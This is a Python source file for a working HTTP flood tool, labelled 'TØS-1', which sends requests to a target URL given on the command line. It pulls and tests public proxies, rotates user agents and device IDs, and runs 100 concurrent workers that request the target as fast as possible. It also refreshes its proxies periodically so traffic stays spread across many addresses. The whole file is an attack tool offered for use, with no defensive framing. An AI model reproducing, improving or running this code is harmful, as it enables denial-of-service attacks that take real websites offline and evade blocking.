import asyncio
import aiohttp
import time
import random
import os
import sys
import concurrent.futures

class TOS1_DEMON:
    def __init__(self, target_url):
        self.target_url = target_url
        self.total_requests = 0
        self.session_id = "S023"
        self.demon_id = "TØS-RR"
        self.maintenance_status = ""
        
        # PROXY SYSTEM - ONLY WORKING ONES
        self.working_proxies = []
        self.proxy_files = ['h1.txt', 'h2.txt']
        self.proxy_api = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all"
        
        # HEADER ROTATION
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        self.device_ids = ['550e8400-e29b-41d4-a716-446655440000', '6ba7b810-9dad-11d1-80b4-00c04fd430c8']
        self.session_ids = ['session_' + ''.join(random.choices('abcdef0123456789', k=16)) for _ in range(5)]
        
        # CONTROL
        self.running = True
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        self.maintenance_interval = 900
        self.proxy_check_interval = 300  # Check proxies every 5 mins
        
        # STATS
        self.start_time = time.time()
        self.current_rps = 0
        self.requests_since_last = 0
        self.last_rps_calc = time.time()
        self.last_proxy_check = time.time()
        
        # THREADING FOR PROXY CHECK
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
        
    async def test_proxy(self, proxy):
        """Test if a proxy is working"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    self.target_url, 
                    proxy=f"http://{proxy}" if proxy else None,
                    timeout=2,
                    ssl=False
                ) as response:
                    if response.status < 500:
                        return proxy
        except:
            pass
        return None
    
    async def find_working_proxies(self):
        """Find working proxies quickly"""
        print("\n[~] Finding working proxies...")
        
        # Get all proxy sources
        all_proxies = []
        
        # From files
        for file in self.proxy_files:
            try:
                if os.path.exists(file):
                    with open(file, 'r') as f:
                        proxies = [line.strip() for line in f if line.strip()]
                        all_proxies.extend(proxies)
            except:
                pass
        
        # From API - get fresh ones
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.proxy_api, timeout=5) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        api_proxies = [p.strip() for p in text.split('\n') if p.strip()]
                        all_proxies.extend(api_proxies[:1000])  # Limit to 1000 from API
        except:
            pass
        
        # Remove duplicates
        all_proxies = list(set(all_proxies))
        
        if not all_proxies:
            print("[!] No proxies found, using direct connection")
            self.working_proxies = [None]
            return
        
        print(f"[+] Testing {min(500, len(all_proxies))} proxies (15s max)...")
        
        # Test proxies concurrently (max 500)
        test_proxies = all_proxies[:500]
        test_tasks = [self.test_proxy(proxy) for proxy in test_proxies]
        
        # Wait 15 seconds for results
        done, pending = await asyncio.wait(test_tasks, timeout=15)
        
        # Collect working proxies
        working = []
        for task in done:
            try:
                result = task.result()
                if result:
                    working.append(result)
            except:
                pass
        
        # Cancel pending tasks
        for task in pending:
            task.cancel()
        
        self.working_proxies = working if working else [None]
        print(f"[+] Found {len(self.working_proxies)} working proxies")
    
    def get_next_proxy(self):
        """Get next working proxy"""
        if not self.working_proxies:
            return None
        
        # Random selection from working proxies
        return f"http://{random.choice(self.working_proxies)}" if self.working_proxies[0] else None
    
    def generate_headers(self):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        if random.random() > 0.5:
            headers['X-Device-ID'] = random.choice(self.device_ids)
        
        return headers
    
    async def send_request(self, session):
        """Send fast request"""
        proxy = self.get_next_proxy()
        headers = self.generate_headers()
        
        try:
            timeout = aiohttp.ClientTimeout(total=3)
            
            if proxy:
                async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=timeout, ssl=False) as response:
                    await response.read()
            else:
                async with session.get(self.target_url, headers=headers, timeout=timeout, ssl=False) as response:
                    await response.read()
                    
        except Exception as e:
            # Mark proxy as bad if it fails multiple times
            pass
        finally:
            self.total_requests += 1
            self.requests_since_last += 1
    
    async def attack_worker(self, session):
        """Worker that sends requests as fast as possible"""
        while self.running and not self.maintenance_mode:
            await self.send_request(session)
            await asyncio.sleep(0)  # Yield control
    
    def calculate_rps(self):
        now = time.time()
        time_diff = now - self.last_rps_calc
        
        if time_diff >= 0.001:
            self.current_rps = self.requests_since_last / time_diff
            self.requests_since_last = 0
            self.last_rps_calc = now
    
    def update_display(self):
        self.calculate_rps()
        
        # Update maintenance status
        if self.maintenance_mode:
            self.maintenance_status = "TØS-MAINTENACE"
        else:
            time_left = self.maintenance_interval - (time.time() - self.last_maintenance)
            if time_left < 60:
                self.maintenance_status = f"M-{int(time_left)}s"
            else:
                self.maintenance_status = f"M-{int(time_left/60)}m"
        
        # ONLY THIS LOG
        sys.stdout.write(f'\rTØS-TRS — {self.total_requests} | {{{self.session_id}, {self.demon_id}, {self.maintenance_status}}}')
        sys.stdout.flush()
    
    async def maintenance(self):
        """Maintenance - refresh everything"""
        self.maintenance_mode = True
        await asyncio.sleep(1)
        
        print("\n[!] MAINTENACE - Refreshing proxies...")
        await self.find_working_proxies()
        
        # Refresh IDs
        self.session_ids = ['session_' + ''.join(random.choices('abcdef0123456789', k=16)) for _ in range(5)]
        
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        os.system('clear')
    
    async def proxy_health_check(self):
        """Check proxies periodically"""
        while self.running:
            if time.time() - self.last_proxy_check >= self.proxy_check_interval:
                if len(self.working_proxies) < 10:  # If we have few working proxies
                    print("\n[~] Proxy health check - refreshing...")
                    await self.find_working_proxies()
                    os.system('clear')
                self.last_proxy_check = time.time()
            await asyncio.sleep(10)
    
    async def monitor_maintenance(self):
        while self.running:
            if time.time() - self.last_maintenance >= self.maintenance_interval:
                await self.maintenance()
            await asyncio.sleep(1)
    
    async def monitor_display(self):
        while self.running:
            self.update_display()
            await asyncio.sleep(0.001)
    
    async def start_attack(self):
        """Start the attack with optimized sessions"""
        # Create shared session for performance
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Create workers
            workers = [self.attack_worker(session) for _ in range(100)]
            
            # Run everything
            await asyncio.gather(
                *workers,
                self.monitor_maintenance(),
                self.monitor_display(),
                self.proxy_health_check(),
                return_exceptions=True
            )
    
    def start(self):
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        time.sleep(2)
        os.system('clear')
        
        # Find working proxies first (15s)
        asyncio.run(self.find_working_proxies())
        
        # Start attack
        asyncio.run(self.start_attack())

# Main
if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Clean start
    os.system('clear')
    print("𝖳Ø𝖲-1 | 𝖲023")
    time.sleep(2)
    os.system('clear')
    
    demon = TOS1_DEMON(target)
    
    try:
        demon.start()
    except KeyboardInterrupt:
        runtime = time.time() - demon.start_time
        avg_rps = demon.total_requests / runtime if runtime > 0 else 0
        print(f"\n\nTOTAL: {demon.total_requests} | AVG RPS: {avg_rps:.1f}")
    except Exception as e:
        print(f"\nError: {e}")
